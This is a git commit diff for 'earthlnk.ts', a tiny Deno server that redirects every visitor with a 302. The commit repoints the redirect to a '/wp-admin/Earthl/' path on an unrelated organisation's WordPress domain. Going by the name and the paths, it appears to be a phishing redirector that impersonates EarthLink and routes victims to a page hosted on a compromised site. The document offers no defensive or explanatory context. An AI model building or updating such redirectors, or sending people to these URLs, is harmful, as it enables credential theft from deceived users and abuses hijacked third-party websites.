da01335458a1a63839508cedeeca7b681f4e6a42
Digital2025001 <bosmichael30@gmail.com>
2025-07-14 14:56:45 -0700

    Update earthlnk.ts

--- earthlnk.ts
+++ earthlnk.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://ultrapro.io/Earthl/_+_==/", // Replace this with your actual link
+      Location: "https://lasikleaders.org/wp-admin/Earthl/_+_==/", // Replace this with your actual link
     },
   });
 });
